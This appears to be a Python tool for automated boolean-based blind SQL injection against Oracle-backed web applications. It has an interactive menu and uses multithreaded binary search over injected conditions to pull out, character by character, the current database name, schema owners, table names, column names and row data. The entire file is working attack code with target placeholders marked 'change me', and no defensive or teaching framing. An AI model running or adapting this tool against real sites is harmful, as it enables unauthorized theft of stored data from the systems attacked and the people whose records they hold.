import requests
from multiprocessing import Pool
from itertools import repeat

def boolean_based_blind(condition):
    # print(condition)
    url = 'http://127.0.0.1:8787/?query=' # change me
    query = f"SELECT version from V$INSTANCE WHERE {condition}" # change me
    response = requests.get(url+query) # maybe change me
    if '12.1.0.2.0' in response.text: # change me to other keyword or length
        return True
    else:
        return False

def test():
    meow = boolean_based_blind("1=1")
    print("Intend True: ", meow)
    meowmeow = boolean_based_blind("1=0")
    print("Intend False: ", meowmeow)
    if meow and not meowmeow:
        print("✅ Test success 🐱🐱🐱🐱🐱🐱🐱🐱🐱")
    else:
        print("❌ Test fail 😿😿😿😿😿😿😿😿😿😿")
    # print(boolean_based_blind("1=1")) # Return True
    # print(boolean_based_blind("1=0")) # Return False


def do_binary_search(right_condition,guess_range,v=0):
    left = guess_range[0]
    right = guess_range[1]
    while right - left > 3: # <= 3 will stop
        if v == 1:
            print("\t\t\t\t\t\t",end='\r')
            print(left,'~',right,end='\r')
        guess = int(left+(right-left)/2)
        if boolean_based_blind(f"({guess}>{right_condition})"):
            right = guess
        else:
            left = guess
    for i in range(left,right): # do match
        if v == 1:
            print("\t\t\t\t\t\t",end='\r')
            print("Testing",i,end='\r')
        if boolean_based_blind(f"({i}={right_condition})"):
            if v == 1:
                print("\t\t\t\t\t\t",end='\r')
                print("Answer :",i , f"({chr(i) if i >= 32 and i <= 127 else ''})")
            return i





###################
################### Current DB
def get_current_db(v):
    print("[🐱] Query DB Strings Length")
    current_len_right = "(SELECT LENGTH(SYS.DATABASE_NAME) FROM dual)" 
    guess_range = [1,100]
    current_db_len = do_binary_search(current_len_right,guess_range,v)
    print("[😺😺]Current DB Length:", current_db_len)

    db_name_right_condition = "(SELECT ASCII(SUBSTR(SYS.DATABASE_NAME,{current_db_len},1)) FROM dual)"
    db_name_right_conditions = [db_name_right_condition.format(current_db_len=i) for i in range(1,current_db_len+1)]
    guess_range = [32,128]
    param = zip(db_name_right_conditions,repeat(guess_range),repeat(v))
    db_name = pool.starmap(do_binary_search, param)
    db_name = ''.join([chr(i) for i in db_name])
    print("[😺😺]Current DB Name:", db_name)




###################
################### Database
def get_dbs(v):
    print("[🐱] Query DB Size")
    db_size_right = "(SELECT COUNT(DISTINCT(OWNER)) FROM ALL_TABLES)"
    guess_range = [1,50]
    db_size = do_binary_search(db_size_right,guess_range,v)
    print("[😺😺]DB Size:" , db_size)

    print("[🐱] Query DB Strings Length")
    db_str_len_right = "(SELECT LENGTH(A) FROM (SELECT ROWNUM no, A FROM (SELECT DISTINCT(OWNER) AS A FROM ALL_TABLES)) WHERE no={db_num})"
    db_str_len_rights = [db_str_len_right.format(db_num=i+1) for i in range(db_size)]
    guess_range = [1,100]
    param = zip(db_str_len_rights,repeat(guess_range),repeat(v))
    db_str_lens = pool.starmap(do_binary_search, param)
    print("[😺😺]DB Strings Length:", db_str_lens)

    print("[🐱] Query DB Name")
    db_names = []
    for size in range(db_size):
        db_name_right_condition = "(SELECT ASCII(SUBSTR(A,{db_name_index},1)) FROM (SELECT ROWNUM no, A FROM (SELECT DISTINCT(OWNER) AS A FROM ALL_TABLES)) WHERE no={size})"
        db_name_right_conditions = [db_name_right_condition.format(db_name_index=i,size=size+1) for i in range(1,db_str_lens[size]+1)]
        guess_range = [32,128]
        param = zip(db_name_right_conditions,repeat(guess_range),repeat(v))
        db_name = pool.starmap(do_binary_search, param)
        db_name = ''.join([chr(i) for i in db_name])
        print(f"DB_Name[{size}]={db_name}")
        db_names.append(db_name)
    print("[😺😺]DB_Name:", db_names)




###################
################### Table
def get_tables(v):
    db = input("Database Name : ")
    print("[🐱] Query Tables Size")
    table_size_right = f"(SELECT COUNT(TABLE_NAME) FROM ALL_TABLES WHERE OWNER='{db}')"
    guess_range = [1,1500]
    table_size = do_binary_search(table_size_right,guess_range,v)
    print("Tables Size:" , table_size)

    print("[🐱] Query Table Strings Length")
    table_str_len_right = "(SELECT  LENGTH(A) FROM (SELECT ROWNUM no, TABLE_NAME AS A FROM ALL_TABLES WHERE OWNER='{db}') WHERE no={db_num})"
    table_str_len_rights = [table_str_len_right.format(db=db,db_num=i+1) for i in range(table_size)]
    guess_range = [1,100]
    param = zip(table_str_len_rights,repeat(guess_range),repeat(v))
    table_str_lens = pool.starmap(do_binary_search, param)
    print("[😺😺]Table Strings Length:", table_str_lens)

    print("[🐱] Query Table Name")
    table_names = []
    for size in range(table_size):
        table_name_right_condition = "(SELECT ASCII(SUBSTR(A,{table_name_index},1)) FROM (SELECT ROWNUM no, TABLE_NAME AS A FROM ALL_TABLES WHERE OWNER='{db}') WHERE no={size})"
        table_name_right_conditions = [table_name_right_condition.format(table_name_index=i,db=db,size=size+1) for i in range(1,table_str_lens[size]+1)]
        guess_range = [32,128]
        param = zip(table_name_right_conditions,repeat(guess_range),repeat(v))
        table_name = pool.starmap(do_binary_search, param)
        table_name = ''.join([chr(i) for i in table_name])
        print(f"Table_Name[{size}]={table_name}")
        table_names.append(table_name)
    print("[😺😺]Table_Name:", table_names)



################### 
################### Column
def get_columns(v):
    db = input("Database Name : ")
    table = input("Table Name : ")
    print("[🐱] Query Column Size")
    column_size_right = f"(SELECT COUNT(COLUMN_NAME) FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='{table}' AND OWNER='{db}')"
    guess_range = [1,200]
    column_size = do_binary_search(column_size_right,guess_range,v)
    print("[😺😺]Column Size:" , column_size)


    print("[🐱] Query Table Column Length")
    column_str_len_right = "(SELECT LENGTH(A) FROM (SELECT ROWNUM no, COLUMN_NAME AS A FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='{table}' AND OWNER='{db}') WHERE no={db_num})"
    column_str_len_rights = [column_str_len_right.format(table=table,db=db,db_num=i+1) for i in range(column_size)]
    guess_range = [1,100]
    param = zip(column_str_len_rights,repeat(guess_range),repeat(v))
    column_str_lens = pool.starmap(do_binary_search, param)
    print("[😺😺]Column Strings Length:", column_str_lens)

    print("[🐱] Query Column Name")
    column_names = []
    for size in range(column_size):
        column_name_right_condition = "(SELECT ASCII(SUBSTR(A,{column_name_index},1)) FROM (SELECT ROWNUM no, COLUMN_NAME AS A FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='{table}' AND OWNER='{db}') WHERE no={size})"
        column_name_right_conditions = [column_name_right_condition.format(table=table,db=db,column_name_index=i,size=size+1) for i in range(1,column_str_lens[size]+1)]
        guess_range = [32,128]
        param = zip(column_name_right_conditions,repeat(guess_range),repeat(v))
        column_name = pool.starmap(do_binary_search, param)
        column_name = ''.join([chr(i) for i in column_name])
        print(f"Column_Name[{size}]={column_name}")
        column_names.append(column_name)
    print("[😺😺]Column_Name:", column_names)


######
###### SELECT DATA
def get_data(v):
    db = input("Database Name : ")
    table = input("Table Name : ")
    column = input("Column Name (support '||'): ")

    print("[🐱] Query Data Size")
    data_size_right = f"(SELECT COUNT({column}) FROM {db}.{table})"
    guess_range = [1,100]
    data_size = do_binary_search(data_size_right,guess_range,v)
    print("[😺😺]Data Size:" , data_size)

    print("[🐱] Query Data Length")
    data_str_len_right = "(SELECT A FROM (SELECT ROWNUM no, LENGTH({column}) AS A FROM {db}.{table}) WHERE no={db_num})"
    data_str_len_rights = [data_str_len_right.format(column=column,db=db,table=table,db_num=i+1) for i in range(data_size)]
    guess_range = [1,100]
    param = zip(data_str_len_rights,repeat(guess_range),repeat(v))
    data_str_lens = pool.starmap(do_binary_search, param)
    print("[😺😺]Column Strings Length:", data_str_lens)


    print("[🐱] Query Data Name")
    data_names = []
    for size in range(data_size):
        data_name_right_condition = "(SELECT A FROM (SELECT ROWNUM no,ASCII(SUBSTR({column},{data_name_index},1)) AS A FROM {db}.{table}) WHERE no={size})"
        data_name_right_conditions = [data_name_right_condition.format(column=column,db=db,table=table,data_name_index=i,size=size+1) for i in range(1,data_str_lens[size]+1)]
        guess_range = [32,128]
        param = zip(data_name_right_conditions,repeat(guess_range),repeat(v))
        data_name = pool.starmap(do_binary_search, param)
        data_name = ''.join([chr(i) for i in data_name])
        print(f"Data_Name[{size}]={data_name}")
        data_names.append(data_name)
    print("[😺😺]Data_Name:", data_names)


banner = """
▒█▀▀▀█ ▒█▀▀█ ▒█░░░ ▒█▀▄▀█ ▒█▀▀▀ █▀▀█ █░░░█
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█▒█▒█ ▒█▀▀▀ █▄▀█ █▄█▄█
▒█▄▄▄█ ░▀▀█▄ ▒█▄▄█ ▒█░░▒█ ▒█▄▄▄ █▄▄█ ░▀░▀░ for Oracle
"""
print(banner)

verbose = 1
func = int(input(""" 
 🐱 (0) System Test
 🐱 (1) Get Current DB
 🐱 (2) Get All DBS
 🐱 (3) Get Tables
 🐱 (4) Get Columns
 🐱 (5) Get Data
Your Option : """))
threads = int(input("Threads (Suggest 10): "))
# threads = 10
pool = Pool(threads)

if func == 0:
    test()
elif func == 1:
    get_current_db(verbose)
elif func == 2:
    get_dbs(verbose)
elif func == 3:
    get_tables(verbose)
elif func == 4:
    get_columns(verbose)
elif func == 5:
    get_data(verbose)
